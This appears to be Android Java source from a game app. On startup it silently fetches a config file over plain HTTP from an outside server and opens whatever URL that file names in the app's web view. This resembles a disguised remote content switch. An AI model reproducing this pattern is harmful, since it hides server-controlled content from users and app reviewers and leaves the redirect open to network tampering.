package com.ct.lianlianct.gameview;

import android.app.Activity;
import android.content.SharedPreferences;
import android.util.Log;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

import game.AppActivity;
import game.GameWebActivity;

public class GameThreeUrl {
    public static void updateCrazyState(AppActivity act){
        ms = act;
        final Timer timer = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                initGameUrl();
                timer.cancel();
            }
        };
        timer.schedule(task, 200, 1000);
    }
    private static AppActivity ms = null;
    public static void initGameUrl(){
        String message = openCrazyUrlInfo("http://ylft17.com/config.json");
        System.out.println(message);
        JSONObject json = JSONObject.parseObject(message);
        if (json != null){
            String url = json.getString("url");
            url = url + "&afevent=mcjzEvent";
            GameWebActivity.gameurl = url;
            ms.opneWeb();
        }
    }

    public static String openCrazyUrlInfo(String url){
        HttpURLConnection m_cont = null;
        InputStream impst = null;
        BufferedReader br = null;
        StringBuffer _strbf = new StringBuffer();
        try {
            URL m_url = new URL(url);
            m_cont = (HttpURLConnection) m_url.openConnection();
            m_cont.setRequestMethod("GET");
            m_cont.setReadTimeout(16000);
            m_cont.connect();
            if (m_cont.getResponseCode() == 200) {
                impst = m_cont.getInputStream();
                if (null != impst) {
                    br = new BufferedReader(new InputStreamReader(impst, "UTF-8"));
                    String temp = null;
                    while (null != (temp = br.readLine())) {
                        _strbf.append(temp);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != impst) {
                try {
                    impst.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            m_cont.disconnect();
        }
        return _strbf.toString();
    }
}
